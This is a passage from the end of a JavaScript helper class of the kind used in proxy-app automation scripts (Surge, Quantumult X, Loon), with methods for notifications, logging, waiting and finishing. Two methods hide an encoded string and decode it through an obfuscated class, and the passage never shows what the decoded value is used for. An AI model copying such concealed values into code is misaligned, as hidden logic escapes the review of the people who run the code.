            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}